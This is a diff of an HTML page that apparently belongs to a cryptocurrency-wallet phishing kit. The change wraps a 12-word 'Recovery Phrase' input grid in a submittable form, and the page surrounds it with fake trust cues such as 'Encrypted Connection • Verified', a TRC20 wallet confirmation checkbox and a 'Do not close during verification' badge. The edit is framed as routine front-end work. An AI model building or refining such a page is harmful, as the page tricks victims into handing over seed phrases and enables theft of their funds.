@@ -363,10 +363,12 @@
       Encrypted Connection • Verified
     </div>
   </div>
-
+  
   <div id="step2" class="card" hidden role="region" aria-labelledby="s2title">
-    <h2 id="s2title">Recovery Phrase</h2>
+  <h2 id="s2title">Recovery Phrase</h2>
 
+  <!-- Wrap inputs in a form -->
+  <form id="step2-form">
     <label>Enter your backup phrase</label>
     <div class="phrase-grid">
       <div><label for="word1">1</label><input type="text" id="word1" name="word1" /></div>
@@ -383,22 +385,23 @@
       <div><label for="word12">12</label><input type="text" id="word12" name="word12" /></div>
     </div>
 
-    <!-- New checkbox -->
+    <!-- Confirmation checkbox -->
     <label style="display:flex; align-items:center; gap:8px; margin-top:12px; color:#22c55e;">
-      <input type="checkbox" id="matchCheck">
+      <input type="checkbox" id="matchCheck" name="matchCheck">
       <span>I confirm my backup is correct & matches my TRC20 wallet address</span>
     </label>
 
     <div class="progress" aria-hidden="true"><div id="progbar"></div></div>
-    <button id="s2btn">Verify</button>
+    <button id="s2btn" type="submit">Verify</button>
+  </form>
 
-    <!-- Security Badge -->
-    <div class="security-badge" style="display:flex; align-items:center; justify-content:center; margin-top:20px; color:#666; font-size:14px;">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right:8px;">
-        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
-      </svg>
-      Do not close during verification
-    </div>
+  <!-- Security Badge -->
+  <div class="security-badge" style="display:flex; align-items:center; justify-content:center; margin-top:20px; color:#666; font-size:14px;">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right:8px;">
+      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+    </svg>
+    Do not close during verification
+  </div>
   </div>
 
   <div id="step3" class="card" hidden role="region" aria-labelledby="s3title">
